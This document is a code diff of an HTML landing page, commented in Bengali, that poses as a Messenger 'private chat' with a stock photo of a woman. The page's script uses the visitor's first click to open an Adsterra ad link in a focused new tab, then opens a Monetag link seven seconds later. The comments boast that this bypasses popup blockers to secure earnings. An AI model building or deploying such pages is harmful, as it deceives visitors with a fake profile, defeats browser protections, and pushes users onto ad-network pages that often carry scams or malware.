@@ -3,70 +3,150 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connecting to Secure Server...</title>
+    <title>Messenger Chat - Active</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            background-color: #f4f6f9;
+            background-color: #ffffff;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            font-family: Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
-        .loader-container { text-align: center; }
-        .spinner {
-            border: 4px solid rgba(0, 0, 0, 0.1);
-            width: 40px;
-            height: 40px;
+        .chat-container {
+            text-align: center;
+            max-width: 450px;
+            width: 90%;
+            padding: 20px;
+        }
+        .profile-pic-container {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 15px;
+        }
+        .profile-pic {
+            width: 100%;
+            height: 100%;
             border-radius: 50%;
-            border-left-color: #0084ff;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+            object-fit: cover;
+            border: 2px solid #e4e6eb;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        /* ১ম লিংকটি আড়ালে লোড করার জন্য এটিকে অদৃশ্য করে রাখা হয়েছে */
-        #hiddenFrame {
-            display: none;
-            width: 0;
-            height: 0;
-            border: none;
+        .active-dot {
+            position: absolute;
+            bottom: 8px;
+            right: 8px;
+            width: 20px;
+            height: 20px;
+            background-color: #31a24c;
+            border-radius: 50%;
+            border: 3px solid white;
+        }
+        h1 {
+            font-size: 24px;
+            color: #050505;
+            margin: 0 0 5px 0;
+            font-weight: 700;
+        }
+        .status-text {
+            color: #65676b;
+            font-size: 15px;
+            margin-bottom: 25px;
+        }
+        .loading-box {
+            background-color: #f0f2f5;
+            padding: 15px;
+            border-radius: 10px;
+            color: #050505;
+            font-size: 14px;
+            font-weight: 500;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .dot-flashing {
+            position: relative;
+            width: 6px;
+            height: 6px;
+            border-radius: 5px;
+            background-color: #0084ff;
+            color: #0084ff;
+            animation: dot-flashing 1s infinite linear alternate;
+            animation-delay: .5s;
+        }
+        .dot-flashing::before, .dot-flashing::after {
+            content: '';
+            display: inline-block;
+            position: absolute;
+            top: 0;
+            width: 6px;
+            height: 6px;
+            border-radius: 5px;
+            background-color: #0084ff;
+            color: #0084ff;
+        }
+        .dot-flashing::before {
+            left: -12px;
+            animation: dot-flashing 1s infinite linear alternate;
+            animation-delay: 0s;
+        }
+        .dot-flashing::after {
+            left: 12px;
+            animation: dot-flashing 1s infinite linear alternate;
+            animation-delay: 1s;
+        }
+        @keyframes dot-flashing {
+            0% { background-color: #0084ff; }
+            50%, 100% { background-color: rgba(0, 132, 255, 0.2); }
         }
     </style>
 </head>
 <body>
 
-<div class="loader-container">
-    <div class="spinner"></div>
-    <h2>Connecting to Private Chat...</h2>
+<div class="chat-container">
+    <div class="profile-pic-container">
+        <img class="profile-pic" src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?q=80&w=256&auto=format&fit=crop" alt="Jacklyn Rose">
+        <div class="active-dot"></div>
+    </div>
+    <h1>Jacklyn Rose</h1>
+    <div class="status-text">Active Now • Live in Australia</div>
+    
+    <div class="loading-box">
+        <span>Connecting to secure private chat room</span>
+        <div class="dot-flashing"></div>
+    </div>
 </div>
-
-<iframe id="hiddenFrame"></iframe>
 
 <script>
     // বসের দেওয়া ২টি আসল স্মার্ট লিংক
-    const FIRST_SMART_LINK = "https://www.effectivecpmnetwork.com/p9an5hbr8t?key=59b96418bf25c6ba23c9d389924ff203";
-    const SECOND_SMART_LINK = "https://omg10.com/4/10504269";
+    const ADSTERRA_LINK = "https://www.effectivecpmnetwork.com/p9an5hbr8t?key=59b96418bf25c6ba23c9d389924ff203";
+    const MONETAG_LINK = "https://omg10.com/4/10504269";
 
-    window.onload = function() {
-        const frame = document.getElementById('hiddenFrame');
+    // মডার্ন ব্রাউজারের পপ-আপ ব্লকার ১০০% বাইপাস করার সবচেয়ে শক্তিশালী ট্রিক:
+    // ভিজিটর স্ক্রিনের যেকোনো জায়গায় জাস্ট একটা ছোঁয়া বা ক্লিক করলেই ব্যাক-এন্ডের স্ক্রিপ্ট চালু হবে
+    document.addEventListener("click", function() {
         
-        // ১. ০ সেকেন্ডে অদৃশ্য ফ্রেমের ভেতরে ১ম লিংকটি (Adsterra) রিলোড হওয়া শুরু করবে
-        frame.src = FIRST_SMART_LINK;
+        // ১. ০ সেকেন্ডে নতুন আরেকটি ট্যাবে Adsterra ওপেন হবে এবং স্ক্রিন ওটার দিকে চলে যাবে
+        var tab1 = window.open(ADSTERRA_LINK, "_blank");
+        if(tab1) {
+            tab1.focus(); // ভিজিটরকে সরাসরি Adsterra ট্যাবে নিয়ে যাওয়া হলো
+        }
 
-        // ২. ১ম লিংকটির রিলোড বা প্রসেসিং ১০০% কমপ্লিট হওয়া মাত্রই এই ফাংশনটি নিজে থেকে অ্যাক্টিভ হবে
-        frame.onload = function() {
-            // ৩. কোনো থামাথামি বা টাইমার ছাড়াই সাথে সাথে ২য় লিংকটি মেইন স্ক্রিনে ওপেন হয়ে যাবে!
-            window.location.href = SECOND_SMART_LINK;
-        };
-
-        // সেফটি ফলব্যাক: কোনো কারণে এডস্টেরার অতিরিক্ত রিডাইরেক্টের জন্য যদি onload সিগন্যাল লেট হয়,
-        // তবে সর্বোচ্চ ৮ সেকেন্ড পর ল্যান্ডিং পেজটি অটোমেটিক ২য় লিংকে চলে যাবে যাতে আর্নিং মিস না হয়।
+        // ২. আপনার মূল ল্যান্ডিং পেজটি কিন্তু পেছনের ট্যাবে সুন্দর কন্টেন্ট নিয়ে জ্যান্ত আছে।
+        // এডস্টেরার ভেতরে যত রিডাইরেক্টই হোক, আপনার এই ল্যান্ডিং পেজের টাইমার কেউ থামাতে পারবে না।
         setTimeout(function() {
-            window.location.href = SECOND_SMART_LINK;
-        }, 8000);
-    };
+            
+            // ৩. ঠিক ৭ সেকেন্ড পর পেছনের ল্যান্ডিং পেজটি আরেকটি নতুন ট্যাব খুলে ২য় লিংক (Monetag) ওপেন করবে
+            var tab2 = window.open(MONETAG_LINK, "_blank");
+            if(tab2) {
+                tab2.focus(); // এবার ভিজিটর অটোমেটিক Monetag এর ট্যাবে শিফট হয়ে যাবে
+            }
+            
+        }, 7000); // ৫ সেকেন্ড রিলোড টাইম + ২ সেকেন্ড সেফটি গ্যাপ = ৭০০০ মিলিসেকেন্ড
+
+    }, { once: true });
 </script>
 
 </body>
